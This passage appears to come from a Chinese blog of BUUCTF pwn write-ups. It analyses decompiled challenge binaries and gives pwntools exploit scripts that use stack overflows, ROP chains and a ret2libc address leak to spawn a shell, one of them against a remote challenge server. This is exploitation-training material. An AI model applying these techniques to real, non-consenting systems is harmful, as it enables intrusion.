class="string">&quot;%s&quot;</span>, (<span class="type">int</span>)var, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="string">&#x27;/images/x11&#x27;</span> )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[<span class="number">0</span>],</span><br><span class="line">        var[<span class="number">1</span>],</span><br><span class="line">        var[<span class="number">2</span>],</span><br><span class="line">        var[<span class="number">3</span>],</span><br><span class="line">        var[<span class="number">4</span>],</span><br><span class="line">        var[<span class="number">5</span>],</span><br><span class="line">        var[<span class="number">6</span>],</span><br><span class="line">        var[<span class="number">7</span>],</span><br><span class="line">        var[<span class="number">8</span>],</span><br><span class="line">        var[<span class="number">9</span>],</span><br><span class="line">        var[<span class="number">10</span>],</span><br><span class="line">        var[<span class="number">11</span>],</span><br><span class="line">        var[<span class="number">12</span>],</span><br><span class="line">        var[<span class="number">13</span>],</span><br><span class="line">        var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!/images/n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>只要保证<code>var[13] == /images/x11</code>，就能get_Shell</p>
<h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./tr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x11</span>) * <span class="number">14</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?/images/n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/ciscn_2019_n_8_shell.png"
                      alt="ciscn_2019_n_8_shell"
                ></p>
<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><h3 id="分析：-7"><a href="#分析：-7" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/bjdctf_2020_babystack_file.png"
                      alt="bjdctf_2020_babystack_file"
                ><br>64位ELF可执行文件，动态链接，开启NX保护。<br>IDA Pro加载，main函数逻辑相对较为简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>且存在后门函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="利用思路：-5"><a href="#利用思路：-5" class="headerlink" title="利用思路："></a>利用思路：</h3><p>栈溢出ROP到rbp+8的位置，构造ROP链，劫持程序执行流程到后门函数即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/bjdctf_2020_babystack_1.png"
                      alt="bjdctf_2020_babystack_1"
                ></p>
<h3 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;[+]Please input the length of your name:/images/n&quot;</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">backdoor_addr = <span class="number">0x4006E6</span></span><br><span class="line">ret_addr = <span class="number">0x400561</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;[+]What&#x27;s u name?/images/n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(ret_addr) + p64(backdoor_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/bjdctf_2020_babystack_2.png"
                      alt="bjdctf_2020_babystack_2"
                ></p>
<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="分析：-8"><a href="#分析：-8" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/ciscn_2019_c_1_file.png"
                      alt="ciscn_2019_c_1_file"
                ><br>64位ELF可执行文件，x86-64架构，之开启NX保护。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine/images/n&quot;</span>);</span><br><span class="line">  begin();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>是一个自实现的加密解密系统（实际只有加密），我们来看看<code>excrypt</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xFu</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xEu</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xDu</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以明显看到有栈溢出，但是我们输入的payload会被加密。</p>
<h3 id="利用思路：-6"><a href="#利用思路：-6" class="headerlink" title="利用思路："></a>利用思路：</h3><p>没有system函数，得泄露基址（ret2libc），然后走向<code>system(&#39;bin/sh)</code>，注意paylaod被加密，要么根据加密逻辑自己先异或，要么直接前面加一个<code>/images/x00</code>，不让它异或。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/ciscn_2019_c_1_1.png"
                      alt="ciscn_2019_c_1_1"
                ><br>可以看到我们距离rbp有0x50字节。</p>
<h3 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28213</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/shad0hun/桌面/PWN/libc/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/shad0hun/桌面/PWN/libc/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;choice!/images/n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">padding = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;/images/x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (padding - <span class="number">1</span>) + p64(pop_rdi_ret_addr)</span><br><span class="line">payload += p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted/images/n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext/images/n/images/n&#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;/images/n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;/images/x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr : &quot;</span> + <span class="built_in">hex</span>(system_addr)) <span class="comment">#0x7ffff7c50d70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh_addr : &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;choice!/images/n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/images/x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (padding - <span class="number">1</span>) + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted/images/n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/ciscn_2019_c_1_2.png"
                      alt="ciscn_2019_c_1_2"
                ></p>
<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>这个分析与之前的jarvisoj_level2一样，只不过换成了64位，传参是用寄存器传参的。</p>
<h3 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x0600A90</span></span><br><span class="line">sys_addr = <span class="number">0x0400603</span></span><br><span class="line">pop_rdi = <span class="number">0x04006b3</span></span><br><span class="line">padding = <span class="number">0x138</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(pop_rdi) + p64(binsh) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/jarvisoj_level2_x64.png"
                      alt="jarvisoj_level2_x64"
                ></p>
<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><h3 id="分析：-9"><a href="#分析：-9" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/get_started_3dsctf_2016_file.png"
                      alt="get_started_3dsctf_2016_file"
                ><br>32位ELF可执行文件，静态连接，开启了NX保护。<br>IDA Pro加载，main函数逻辑很简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>通过查找字符串，还存在一个函数<code>get_flag</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="利用思路：-7"><a href="#利用思路：-7" class="headerlink" title="利用思路："></a>利用思路：</h3><p>main函数有栈溢出，利用栈溢出劫持程序流程到get_flag函数即可。<br>调试：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/get_started_3dsctf_2016_1.png"
                      alt="get_started_3dsctf_2016_1"
                ><br>没看到ebp，那看一下main函数汇编：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048A3B                 xor     eax, eax</span><br><span class="line">.text:08048A3D                 add     esp, 3Ch</span><br><span class="line">.text:08048A40                 retn</span><br><span class="line">.text:08048A40 main            endp</span><br></pre></td></tr></table></figure></div>
<p>可以知道我们只需要覆盖0x38字节即可。</p>
<h2 id="images-HarekazeCTF2019-images-baby-rop"><a href="#images-HarekazeCTF2019-images-baby-rop" class="headerlink" title="&#x2F;images&#x2F;[HarekazeCTF2019&#x2F;images&#x2F;]baby_rop"></a>&#x2F;images&#x2F;[HarekazeCTF2019&#x2F;images&#x2F;]baby_rop</h2><h3 id="分析：-10"><a href="#分析：-10" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/baby_rop_file.png"
                      alt="baby_rop_file"
                ><br>64位ELF可执行文件，动态链接，开启NX保护。<br>IDA Pro加载，main函数逻辑较为简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n /images/&quot;</span>What<span class="string">&#x27;s your name? /images/&quot;&quot;);</span></span><br><span class="line"><span class="string">  __isoc99_scanf(&quot;%s&quot;, v4);</span></span><br><span class="line"><span class="string">  printf(&quot;Welcome to the Pwn World, %s!/images/n&quot;, v4);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>这里有明显的溢出。</p>
<h3 id="利用思路：-8"><a href="#利用思路：-8" class="headerlink" title="利用思路："></a>利用思路：</h3><p>初步设计一个利用思路：利用栈溢出，溢出到system，并使其参数为<code>&#39;/bin/sh&#39;</code>即可。</p>
<h3 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP:"></a>EXP:</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">24</span></span><br><span class="line">call_system_addr = <span class="number">0x4005E3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x601048</span></span><br><span class="line">pop_rdi_addr = <span class="number">0X400683</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_addr) + p64(bin_sh_addr) </span><br><span class="line">payload += p64(call_system_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/baby_rop_flag.png"
                      alt="baby_rop_flag"
                ></p>
<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><h3 id="分析：-11"><a href="#分析：-11" class="headerlink" title="分析："></a>分析：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/others_shellcode_file.png"
                      alt="others_shellcode_file"
                ><br>32位ELF可执行文件，动态链接，开启NX和PIE保护。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">argc= dword ptr  <span class="number">8</span></span><br><span class="line">argv= dword ptr  <span class="number">0</span>Ch</span><br><span class="line">envp= dword ptr  <span class="number">10</span>h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">call    __x86_get_pc_thunk_ax</span><br><span class="line">add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">call    getShell</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br><span class="line">; &#125; <span class="comment">// starts at 57D</span></span><br><span class="line">main endp</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">; <span class="type">int</span> <span class="title function_">getShell</span><span class="params">()</span></span><br><span class="line">public getShell</span><br><span class="line">getShell proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">call    __x86_get_pc_thunk_ax</span><br><span class="line">add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">xor     edx, edx        ; envp</span><br><span class="line">push    edx</span><br><span class="line">push    <span class="number">68732F</span>2Fh</span><br><span class="line">push    <span class="number">6E69622</span>Fh</span><br><span class="line">mov     ebx, esp        ; file</span><br><span class="line">push    edx</span><br><span class="line">push    ebx</span><br><span class="line">mov     ecx, esp        ; argv</span><br><span class="line">mov     eax, <span class="number">0F</span>FFFFFFFh</span><br><span class="line">sub     eax, <span class="number">0F</span>FFFFFF4h</span><br><span class="line"><span class="type">int</span>     <span class="number">80</span>h             ; LINUX - sys_execve</span><br><span class="line">nop</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br><span class="line">; &#125; <span class="comment">// starts at 550</span></span><br><span class="line">getShell endp ; sp-analysis failed</span><br></pre></td></tr></table></figure></div>
